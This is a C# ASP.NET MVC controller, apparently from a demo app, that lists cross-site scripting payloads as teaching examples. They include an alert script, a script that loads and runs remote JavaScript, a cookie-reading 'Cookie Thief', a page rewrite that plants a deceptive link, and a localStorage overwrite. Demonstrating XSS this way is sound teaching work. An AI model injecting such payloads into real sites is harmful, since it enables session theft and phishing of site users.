using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace BadGuy.Controllers
{
    public class XssController : Controller
    {
        //
        // GET: /Xss/

        public ActionResult Index()
        {
            return View();
        }

        public ActionResult InjectionValues()
        {
            var examples = new List<InjectionExample>
                               {
                                   new InjectionExample
                                       {
                                           Title = "Image Loading Example",
                                           Content = @"<img src='http://placekitten.com/200/400' />"
                                       },
                                   new InjectionExample
                                       {
                                           Title = "Simple 'Hello World' Example",
                                           Content = @"#winning<script>alert('hello world!');</script>"
                                       },
                                   new InjectionExample
                                       {
                                           Title = "Script Loading Example",
                                           Content =
                                               @"Hi mom! <script>$.getScript('http://erkie.github.com/asteroids.min.js');</script>"
                                       },
                                   new InjectionExample
                                       {
                                           Title = "Cookie Thief!",
                                           Content =
                                               @"First!<script>alert('Sending the following cookie info to bad people:  ' + document.cookie);</script>"
                                       },
                                   new InjectionExample
                                       {
                                           Title = "Content Replacement",
                                           Content =
                                               @"This cat is lolz: <br/><tt> &nbsp;&nbsp; ____<br>&nbsp; (.&nbsp;&nbsp; \<br>&nbsp;&nbsp;&nbsp; \&nbsp; |&nbsp;&nbsp; <br>
                                                &nbsp;&nbsp;&nbsp;&nbsp; \ |___(\--/)<br>&nbsp;&nbsp; __/&nbsp;&nbsp;&nbsp; (&nbsp; . . )<br>&nbsp; ""'._.&nbsp;&nbsp;&nbsp; '-.O.'<br>
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '-.&nbsp; \ ""|\<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '.,,/'.,,mrf</tt>
                                                <script>$(function(){$(""#comments>tbody>tr>td.content:first"").html(""Hey buddy you should totally click on this link! <a href='http://www.nooooooooooooooo.com/'>Nothing bad will happen!</a>"");});</script>"
                                       },
                                   new InjectionExample
                                       {
                                           Title = "Local Storage Hijacking",
                                           Content =
                                               "Take that Mr. Bourgeoisie. <script>localStorage.setItem('userhandle', 'Mr. Fancy Pants')</script>"
                                       }
                               };

            return View(examples);
        }
    }

    public class InjectionExample
    {
        public string Title { get; set; }
        public string Content { get; set; }
    }
}
